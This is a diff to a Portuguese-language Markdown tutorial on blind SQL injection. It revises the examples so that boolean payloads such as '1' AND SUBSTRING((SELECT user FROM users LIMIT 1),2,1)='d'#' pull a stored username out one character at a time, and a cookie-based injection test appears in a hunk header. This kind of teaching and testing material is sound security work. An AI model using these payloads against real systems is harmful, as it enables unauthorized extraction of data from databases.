@@ -138,7 +138,7 @@ Cookie: id=1' AND 1=1#
 
 #### Exemplo:
 
-1' AND SUBSTRING(user(),1,1)='a'#
+`1' AND SUBSTRING((SELECT user FROM users LIMIT 1),1,1)='a'#`
 
 Se TRUE, o primeiro caractere é 'a'.
 
@@ -148,10 +148,12 @@ Se TRUE, o primeiro caractere é 'a'.
 
 Repetir para cada posição:
 
-1' AND SUBSTRING(user(),2,1)='d'#
-1' AND SUBSTRING(user(),3,1)='m'#
-1' AND SUBSTRING(user(),4,1)='i'#
-1' AND SUBSTRING(user(),5,1)='n'#
+```sql
+1' AND SUBSTRING((SELECT user FROM users LIMIT 1),2,1)='d'#
+1' AND SUBSTRING((SELECT user FROM users LIMIT 1),3,1)='m'#
+1' AND SUBSTRING((SELECT user FROM users LIMIT 1),4,1)='i'#
+1' AND SUBSTRING((SELECT user FROM users LIMIT 1),5,1)='n'#
+```
 
 ---
 
